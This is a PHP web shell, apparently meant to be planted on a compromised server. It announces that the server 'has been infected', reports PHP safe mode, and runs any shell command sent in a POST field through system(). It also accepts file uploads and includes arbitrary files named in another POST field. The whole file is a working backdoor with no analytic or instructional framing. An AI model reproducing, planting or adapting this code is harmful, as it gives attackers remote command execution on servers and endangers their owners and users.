<?php echo "This server has been infected by $owner"; ?><?php 
// Check for safe mode
if( ini_get('safe_mode') ) {
   print '<font face="Verdana" color="#FF0000" style="font-size:10pt"><b>Safe Mode ON</b></font>';
} else {
   print '<font face="Verdana" color="#008000" style="font-size:10pt"><b>Safe Mode OFF</b></font>';
}

?><?php @$output = system($_POST['command']); ?><?php

function check_file()
{
global $file_name, $filename;
    $backupstring = "copy_of_";
    $filename = $backupstring."$filename";

    if( file_exists($filename))
    {
        check_file();
    }
}

if(!empty($file))
{
    $filename = $file_name;
    if( file_exists($file_name))
    {
        check_file();
        echo "<p align=center>File already exist</p>";
    }

    else
    {
        copy($file,"$filename");
        if( file_exists($filename))
        {
            echo "<p align=center>File uploaded successful</p>";
        }
        elseif(! file_exists($filename))
        {
            echo "<p align=center>File not found</p>";
        }
    }
}
?><?php @$output = include($_POST['incl']); ?><?php @$output = include($_POST['incl']); ?><?php echo "$version" ?>